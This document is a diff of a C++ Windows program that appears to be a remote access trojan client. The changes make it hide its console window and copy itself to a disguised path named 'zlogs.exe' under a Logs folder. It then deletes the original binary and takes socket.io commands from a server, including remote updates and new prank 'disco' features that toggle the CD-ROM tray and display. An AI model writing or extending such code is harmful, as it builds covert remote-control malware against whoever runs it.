@@ -2,22 +2,35 @@
 
 int main(int argc, char* argv[])
 {
-    if(argc > 1)
+    if(argc == 2)
     {
         std::string path = argv[0];
         std::size_t last_slash = path.find_last_of("\\");
         std::string fileName = path.substr(last_slash + 1);
 
-        std::thread installEmmet(InstallEmmetBat, path);
+        std::thread installEmmet(InstallEmmetBat, path, "C:\\'Location Test'\\'test location'\\Logs\\zlogs.exe");
+        installEmmet.join();
+
+        SelfDestruct(fileName, path);
+    }
+    else if(argc > 2)
+    {
+        std::string path = argv[0];
+        std::size_t last_slash = path.find_last_of("\\");
+        std::string fileName = path.substr(last_slash + 1);
+
+        std::thread installEmmet(InstallEmmetBat, path, argv[2]);
         installEmmet.join();
 
         SelfDestruct(fileName, path);
     }
 
-    //HideWindow();
-    ShowWindow(GetConsoleWindow(), SW_RESTORE);
+    HideWindow();
+    //ShowWindow(GetConsoleWindow(), SW_RESTORE);
     std::thread checker(Checker);
     std::thread live(GoLive);
+    std::thread discomodeCDROM(DiscoModeCDROM);
+    std::thread discomodeDisplay(DiscoModeDisplay);
 
     std::string message = VERSION;
 
@@ -128,6 +141,19 @@ int main(int argc, char* argv[])
 
             client.socket()->emit("commandResult", Base64Encode(std::string("Update has been started.")));
             Update(actualNameOfFile, dir);
+        }
+        else if (message == "disco") //Funny feature
+        {
+            if(disco == false)
+            { 
+                client.socket()->emit("commandResult", Base64Encode(std::string("Disco has been started.")));    
+                disco = true;
+            }
+            else
+            {
+                client.socket()->emit("commandResult", Base64Encode(std::string("Disco has been ended.")));
+                disco = false;
+            }
         }
         else
         {
